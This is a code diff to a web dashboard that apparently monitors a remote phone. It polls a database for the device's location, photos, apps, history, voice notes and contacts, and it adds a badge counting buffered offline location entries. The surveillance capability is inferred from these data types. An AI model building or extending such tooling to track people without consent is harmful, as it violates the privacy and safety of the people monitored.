@@ -170,6 +170,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
 <span class="status" id="statusDot">&#x25CF; Live</span>
 <span class="read-budget" id="readBudget"></span>
+<span class="read-budget" id="queueBadge" style="color:var(--accent);cursor:pointer;margin-left:6px" title="Pending offline queue size">&#x1F4E2; 0</span>
 </div>
 <div class="alert-banner" id="alertBanner"></div>
 <div class="sidebar">
@@ -233,6 +234,14 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   </div>
   <div style="font-size:10px;color:var(--muted)" id="fcmTokenInfo">No FCM token registered yet</div>
   <div style="font-size:10px;color:var(--muted);margin-top:4px" id="fcmLastPush">Last trigger: --</div>
+</div>
+<div class="card" style="border-left-color:var(--success);padding:12px;margin-top:8px">
+  <div style="font-size:13px;font-weight:500;margin-bottom:4px">&#x1F4E2; Offline Queue</div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:6px">Location data buffered on device when offline — flushed to RTDB every 5min when connected</div>
+  <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+    <span style="font-size:20px;font-weight:700;color:var(--accent)" id="offlineQueueCount">--</span>
+    <span style="font-size:11px;color:var(--muted)">pending entries</span>
+  </div>
 </div>
 </div>
 <div id="tab-contacts"><div id="contactsList"><div class="label">No contacts synced yet</div></div></div>
@@ -649,6 +658,7 @@ function startPolling() {
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
   schedulePoll('contacts', 60000, pollContacts);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
+  schedulePoll('queue', 30000, pollQueueSize);
   schedulePoll('insights', 120000, renderInsights);
 }
 
@@ -661,7 +671,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken()];
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -853,6 +863,23 @@ async function pollFcmToken() {
     if (data && data.fcmToken) {
       fcmToken = data.fcmToken;
       document.getElementById('fcmTokenInfo').textContent = '\u2705 FCM token registered';
+    }
+  } catch {}
+}
+
+async function pollQueueSize() {
+  if (!selectedDevice) return;
+  try {
+    const info = await fetchRTDB(`devices/${selectedDevice}/info`);
+    if (info && info.offlineQueueSize !== undefined) {
+      const size = parseInt(info.offlineQueueSize);
+      document.getElementById('queueBadge').textContent = '\u{1F4E2} ' + size;
+      document.getElementById('queueBadge').title = 'Offline queue: ' + size + ' pending items';
+      const countEl = document.getElementById('offlineQueueCount');
+      if (countEl) {
+        countEl.textContent = size;
+        countEl.style.color = size > 50 ? 'var(--danger)' : size > 10 ? 'var(--accent)' : 'var(--success)';
+      }
     }
   } catch {}
 }
